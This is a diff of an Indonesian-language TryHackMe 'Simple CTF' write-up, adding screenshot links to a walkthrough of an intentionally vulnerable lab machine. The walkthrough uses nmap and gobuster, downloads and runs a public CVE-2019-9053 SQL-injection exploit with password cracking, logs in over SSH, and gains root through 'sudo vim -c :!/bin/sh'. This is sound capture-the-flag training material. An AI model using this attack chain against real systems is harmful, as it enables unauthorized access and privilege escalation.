@@ -3,8 +3,7 @@
 - IP Machine: 10.10.128.226
 
 ## Port Scanning
-- Baris perintah: `nmap -sC -sV <IP Machine>`
-
+- Scan menggunakan tool nmap dengan perintah: `nmap -sC -sV <IP Machine>`
 ```sh
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -sC -sV 10.10.128.226   
@@ -47,53 +46,78 @@ Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
 
 - Buka halaman web `http://<IP_machine>` di browser
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%201.JPG)
 
 ## Gobuster
 - Cari directory web menggunakan tool gobuster dengan perintah `gobuster dir -u http://<IP_Machine> -w <wordlists>`
 
-
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%202.JPG)
 
 ## Gain Access
 - Dari hasil tool gobuster ditemukan halaman **/simple** buka halaman tersebut di browser dengan url `http://<IP_Machine>/simple`
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%203.JPG)
 
 - Di halaman tersebut terdapat informasi bahwa halaman tersebut dibuat dengan CMS Made Simple versi 2.2.8
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%204.JPG)
 
 - Cari exploit CMS tersebut di google
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%205.JPG)
+
 - Di web https://www.exploit-db.com/exploits/46635 terdapat informasi bahwa celah keamanan CMS tersebut adalah SQL Injection (SQLi)
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%206.JPG)
 
 - Kita bisa mendownload script exploit di https://www.exploit-db.com/exploits/46635 untuk python versi 3 kita bisa mendownload script di https://github.com/e-renna/CVE-2019-9053 menggunakan wget
 ```sh
 wget https://raw.githubusercontent.com/e-renna/CVE-2019-9053/master/exploit.py
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%207.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%208.JPG)
+
 - Jalankan program exploit.py dengan perintah sebagai berikut:
 ```sh
 python3 exploit.py -u http://<IP_Machine>/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%209.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2010.JPG)
 
 - Proses exploit berhasil, sekarang kita bisa menggunakan username dan password tersebut untuk mengakses SSH dengan perintah `ssh mitch@IP_Machine -p 2222`
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2011.JPG)
+
 - Setelah berhasil login, disana terdapat file **user.txt** yang berisi user flag. Baca isi dengan perintah `cat user.txt`
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2012.JPG)
+
 - Pada directory home, selain ditemukan directory **mitch** juga ditemukan directory **sunbath**
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2013.JPG)
 
 
 ## Privilege Escalation
 - Gunakan perintah `sudo -l` untuk melihat perintah yang bisa dijalankan tanpa akses root. Disini kita dapat menjalankan **vim** dengan perintah **sudo**
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2014.JPG)
+
 - Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/vim/ untuk mendapatkan akses root melalui vim
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2015.JPG)
 
 - Jalankan script diatas untuk mendapatkan akses root
 ```sh
 sudo vim -c ':!/bin/sh'
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2016.JPG)
+
 - Sekarang kita tinggal membaca file root.txt sebagai root flag dengan perintah `cat /root/root.txt`
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2017.JPG)
 
 
 ## Pertanyaan dan Jawaban:
